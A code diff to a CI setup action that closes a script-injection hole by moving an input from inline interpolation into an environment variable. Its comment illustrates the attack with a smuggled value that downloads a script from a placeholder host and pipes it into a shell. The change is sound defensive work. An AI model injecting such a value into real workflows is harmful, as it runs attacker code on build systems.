@@ -86,6 +86,15 @@ runs:
         inputs.install-mode != 'frozen' &&
         inputs.install-mode != 'none'
       shell: bash
+      # THE-541: the input reaches the shell through `env:`, never through `${{ }}` interpolation
+      # into `run:`. Interpolation happens BEFORE the shell runs, so the value is pasted into the
+      # script as source text — a caller passing `'; curl evil.sh | sh; '` would have it executed,
+      # not echoed. Every caller passes a literal today, but THE-505 takes this action from 5 call
+      # sites toward every workflow, and the fix is far cheaper now than after that spreads.
+      # The variable is double-quoted per the opengrep rule; the inner single quotes are display
+      # only, and inside double quotes a shell expansion is not re-evaluated as source.
+      env:
+        INSTALL_MODE: ${{ inputs.install-mode }}
       run: |
-        echo "setup-repo: unknown install-mode '${{ inputs.install-mode }}' (expected frozen-no-scripts | frozen | none)"
+        echo "setup-repo: unknown install-mode '$INSTALL_MODE' (expected frozen-no-scripts | frozen | none)"
         exit 1
